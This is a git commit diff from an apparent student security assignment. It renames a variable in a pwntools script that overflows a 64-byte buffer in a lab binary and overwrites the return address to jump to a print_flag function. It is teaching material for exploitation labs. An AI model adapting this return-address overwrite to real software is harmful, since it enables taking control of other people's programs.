b70fec6e58a08279d412ae253478fd86fd710785
Doug Edwards <74379018+dougFE@users.noreply.github.com>
2025-11-07 01:32:23 +0000

    changed var names

--- assignment-2/2-overflow-the-world/part2.py
+++ assignment-2/2-overflow-the-world/part2.py
@@ -5,11 +5,11 @@ exe = ELF("./overflow-the-world")
 r = process([exe.path])
 # gdb.attach(r)
 
-win = exe.symbols["print_flag"]
+print_call = exe.symbols["print_flag"]
 
 payload = b'A' * 64      # Fill buffer
 payload += b'B' * 8
-payload += p64(win)      # Overwrite return address with print_flag
+payload += p64(print_call)      # Overwrite return address with print_flag
 
 r.recvuntil(b"What's your name? ")
 r.sendline(payload)
